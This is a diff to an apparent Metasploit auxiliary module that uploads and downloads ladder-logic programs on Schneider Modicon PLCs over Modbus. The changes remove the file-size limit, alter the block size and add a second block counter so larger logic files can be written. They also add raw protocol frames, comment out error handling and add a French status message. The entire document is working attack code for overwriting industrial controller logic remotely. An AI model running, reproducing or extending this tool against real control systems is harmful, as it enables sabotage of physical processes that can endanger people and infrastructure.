@@ -9,6 +9,7 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::Tcp
   include Rex::Socket::Tcp
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
@@ -128,7 +129,8 @@ class Metasploit3 < Msf::Auxiliary
       print_error("No answer from target")
       exit
     elsif r.unpack("C*")[-2] == 218
-      handle_error(r)
+      print_error("Apparently there is an error")
+      #handle_error(r)
     else
       return r
     end
@@ -234,14 +236,18 @@ class Metasploit3 < Msf::Auxiliary
   # blank logic files will be available on the Digital Bond website
   def writefile
     print_status "#{rhost}:#{rport} - MODBUS - Sending write request"
-    blocksize = 244	# bytes per block in file transfer
+    #blocksize = 244  # bytes per block in file transfer
+    blocksize = 218 # bytes per block in file transfer
     buf = File.open(datastore['FILENAME'], 'rb') { |io| io.read }
     fullblocks = buf.length / blocksize
-    if fullblocks > 255
-      print_error("#{rhost}:#{rport} - MODBUS - File too large, aborting.")
-      return
-    end
+    #if fullblocks > 255
+    # print_error("#{rhost}:#{rport} - MODBUS - File too large, aborting.")
+    # return
+    #end
+    print_status "Total number of blocks : #{fullblocks}"
     lastblocksize = buf.length - (blocksize*fullblocks)
+    lastblocksize_enhexa = [lastblocksize].pack("c")
+    print_status "Last block size : #{lastblocksize}"
     fileblocks = fullblocks
     if lastblocksize != 0
       fileblocks += 1
@@ -252,14 +258,27 @@ class Metasploit3 < Msf::Auxiliary
     elsif filetype == "APB"
       filenum = "\x10"
     end
+    send_frame(make_frame("\x00\x5a\x01\x41\xff\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x03\x01"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))
+    send_frame(make_frame("\x00\x5a\x01\x04"))   
+    send_frame(make_frame("\x00\x5a\x00\x58\x02\x01\x00\x00\x00\x00\x00\xe1\x00"))
+    send_frame(make_frame("\x00\x5a\x00\x02"))
+    
+
+    send_frame(make_frame("\x00\x5a\x01\x04"))
     send_frame(make_frame("\x00\x5a\x00\x03\x01"))
     send_frame(make_frame("\x00\x5a\x00\x02"))
-    send_frame(make_frame("\x00\x5a\x01\x04"))
     send_frame(make_frame("\x00\x5a\x00\x02"))
     send_frame(make_frame("\x00\x5a\x01\x04"))
-    send_frame(make_frame("\x00\x5a\x00\x58\x02\x01\x00\x00\x00\x00\x00\xfb\x00"))
-    send_frame(make_frame("\x00\x5a\x00\x02"))
-    response = send_frame(make_frame("\x00\x5a\x01\x30\x00" + filenum))
+    
+
+    payload = "\x00\x5a\x01\x30\x00"
+    payload += filenum
+    response = send_frame(make_frame(payload))
     if response[8..9] == "\x01\xfe"
       print_status("#{rhost}:#{rport} - MODBUS - Write request success!  Writing file...")
     else
@@ -269,17 +288,25 @@ class Metasploit3 < Msf::Auxiliary
     payload = "\x00\x5a\x01\x04"
     send_frame(make_frame(payload))
     block = 1
+    block2 = 0
+    block_nb = 1
     block2status = 0 # block 2 must always be sent twice
-    while block <= fullblocks
+    while block_nb < (fileblocks - 1)
+      block_nb = block2*16*16 + block
+      if block == 256
+        block = 0
+        block2 += 1
+      end
       payload = "\x00\x5a\x01\x31\x00"
       payload += filenum
       payload += [block].pack("c")
-      payload += "\x00\xf4\x00"
-      payload += buf[((block - 1) * 244)..((block * 244) - 1)]
+      payload += [block2].pack("c")
+      payload += "\xda\x00"
+      payload += buf[(((block2*16*16 + block) - 1) * 218)..(((block2*16*16 + block) * 218) - 1)]
       res = send_frame(make_frame(payload))
-      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
+      print_status "Envoi du block #{block_nb}/#{fullblocks} (#{block2}::#{block})"
       if res[8..9] != "\x01\xfe"
-        print_error("#{rhost}:#{rport} - MODBUS - Failure writing block #{block}")
+        print_error("#{rhost}:#{rport} - MODBUS - Failure writing block #{block_nb}")
         return
       end
       # redo this iteration of the loop if we're on block 2
@@ -291,12 +318,15 @@ class Metasploit3 < Msf::Auxiliary
       block += 1
     end
     if lastblocksize > 0
+      print_status "Last Block !"
+      print_status "Size : #{lastblocksize}"
       payload = "\x00\x5a\x01\x31\x00"
       payload += filenum
       payload += [block].pack("c")
-      payload += "\x00" + [lastblocksize].pack("c") + "\x00"
-      payload += buf[((block-1) * 244)..(((block-1) * 244) + lastblocksize)]
-      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
+      payload += [block2].pack("c")
+      payload += [lastblocksize].pack("c") + "\x00"
+      payload += buf[(((block2*16*16 + block)-1) * 218)..((((block2*16*16 + block)-1) * 218) + lastblocksize)]
+      print_status "#{rhost}:#{rport} - MODBUS - Block #{block_nb}: #{payload.inspect}"
       res = send_frame(make_frame(payload))
       if res[8..9] != "\x01\xfe"
         print_error("#{rhost}:#{rport} - MODBUS - Failure writing last block")
@@ -304,7 +334,7 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
     vprint_status "#{rhost}:#{rport} - MODBUS - Closing file"
-    payload = "\x00\x5a\x01\x32\x00\x01" + [fileblocks].pack("c") + "\x00"
+    payload = "\x00\x5a\x01\x32\x00\x01" + [fileblocks].pack("c") + "\x0a"
     send_frame(make_frame(payload))
   end
 
@@ -340,7 +370,7 @@ class Metasploit3 < Msf::Auxiliary
     payload = "\x00\x5a\x01\x35\x00\x01" + [block].pack("c") + "\x00"
     send_frame(make_frame(payload))
     # I cannot use store_loot as the "session" variable is undefined. Is it because it is an auxiliary module ?
-    #loot = store_loot('schneider.ladder_logic', 'application/octet-stream', session, filedata, 'Station.apx', 'Schneider Modicon ladder logic')
+    #store_loot('schneider.ladder_logic', 'application/octet-stream', nil, filedata, 'Station.apx', 'Schneider Modicon ladder logic')
     file.print filedata
     file.close
   end
